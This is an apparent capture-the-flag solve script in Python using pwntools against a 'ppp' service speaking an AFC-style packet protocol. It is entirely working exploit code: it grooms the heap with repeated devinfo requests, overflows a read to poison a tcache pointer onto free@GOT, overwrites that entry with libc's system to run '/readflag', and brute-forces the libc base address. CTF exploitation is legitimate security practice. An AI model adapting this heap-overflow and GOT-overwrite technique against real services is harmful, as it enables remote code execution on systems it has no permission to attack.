#!/usr/bin/env python3
from time import sleep

from pwn import context, log, p64, remote, u64

context.log_level = "info"
context.arch = "amd64"

HOST = "ppp.chals.sekai.team"
PORT = 1337

LIBC_SYSTEM = 0x52290
LIBC_FREE_HOOK = 0x1EEE48
FREE_GOT = 0x404070

AFC_MAGIC = b"CFA6LPAA"
AFC_HDR_SZ = 0x28

AFC_OP_STATUS = 1
AFC_OP_DATA = 2
AFC_OP_FILE_OPEN_RES = 0xE


def afc_hdr(entire, this, pkt_num, op):
    return AFC_MAGIC + p64(entire) + p64(this) + p64(pkt_num) + p64(op)


def afc_pkt(op, payload=b"", pkt_num=0, entire=None, this=None):
    if entire is None:
        entire = AFC_HDR_SZ + len(payload)
    if this is None:
        this = AFC_HDR_SZ + len(payload)
    return afc_hdr(entire, this, pkt_num, op) + payload


def recv_afc(io):
    hdr = io.recvn(AFC_HDR_SZ)
    entire = u64(hdr[8:16])
    pkt_num = u64(hdr[24:32])
    op = u64(hdr[32:40])
    payload = io.recvn(entire - AFC_HDR_SZ) if entire > AFC_HDR_SZ else b""
    return op, pkt_num, payload


def send_data(io, pkt_num, data):
    io.send(afc_pkt(AFC_OP_DATA, data, pkt_num))


def send_status(io, pkt_num, status=0):
    io.send(afc_pkt(AFC_OP_STATUS, p64(status), pkt_num))


def send_file_handle(io, pkt_num, handle):
    io.send(afc_pkt(AFC_OP_FILE_OPEN_RES, p64(handle), pkt_num))


def do_devinfo(io, payload):
    io.sendline(b"devinfo")
    op, pkt_num, _ = recv_afc(io)
    send_data(io, pkt_num, payload)
    io.recvuntil(b"afc> ")


def do_read_overflow(io, overflow_size, overflow_data):
    io.sendline(b"read /x")

    op, pkt_num, _ = recv_afc(io)
    send_file_handle(io, pkt_num, 1)

    op, pkt_num, _ = recv_afc(io)
    hdr = afc_hdr(AFC_HDR_SZ, AFC_HDR_SZ + overflow_size, pkt_num, AFC_OP_DATA)
    io.send(hdr + overflow_data)

    op, pkt_num, _ = recv_afc(io)
    send_status(io, pkt_num, 0)

    io.recvuntil(b"afc> ")


def try_exploit(libc_base):
    try:
        io = remote(HOST, PORT)
        io.recvuntil(b"afc> ")

        system_addr = libc_base + LIBC_SYSTEM

        # Step 1: shape the heap with 10 devinfos (two 8-byte strings each)
        for i in range(10):
            do_devinfo(io, b"A" * 7 + b"\x00" + b"B" * 7 + b"\x00")

        # Step 2: overflow into adjacent tcache chunk, poison fd -> free@GOT
        payload = b"\x00" * 0x10 + p64(0) + p64(0x21) + p64(FREE_GOT)
        do_read_overflow(io, len(payload), payload)

        # Step 3: trigger devinfo whose strdup allocations drain the chain
        io.sendline(b"devinfo")
        op, pkt_num, _ = recv_afc(io)

        pad = b"A" * 24 + b"\x00"
        system_bytes = p64(system_addr).rstrip(b"\x00") + b"\x00"
        cmd = b"/readflag sekai ppp\x00"
        payload2 = pad + cmd + b"PADDING\x00" + system_bytes
        send_data(io, pkt_num, payload2)

        sleep(0.5)
        data = io.recvall(timeout=2)
        io.close()
        if b"SEKAI{" in data:
            print(f"SUCCESS with libc_base = {libc_base:#x}")
            print(data.decode(errors="replace"))
            return True
        return False
    except Exception:
        return False


def main():
    REMOTE_LIBC_BASE = 0x7FFFF7D65000
    LOCAL_LIBC_BASE = 0x7FFFF7D63000

    base_start = 0x7FFFF7D00000
    base_end = 0x7FFFF7F00000
    step = 0x1000

    for base in range(base_start, base_end, step):
        log.info(f"Trying libc_base = {base:#x}")
        if try_exploit(base):
            break


if __name__ == "__main__":
    main()
